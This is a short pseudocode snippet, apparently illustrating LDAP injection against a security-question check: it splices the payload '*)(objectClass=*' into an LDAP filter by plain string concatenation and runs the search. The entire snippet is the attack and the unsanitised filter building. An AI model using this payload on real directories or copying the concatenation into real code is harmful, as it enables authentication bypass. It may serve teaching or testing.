class SecurityQuestionLDAPInjection {
    function attack_ldap_questions() {
        let malicious_answer = "*)(objectClass=*"
        let filter = "(&(securityAnswer=" + malicious_answer + ")(objectClass=user))"
        ldap_search(filter)
    }
}

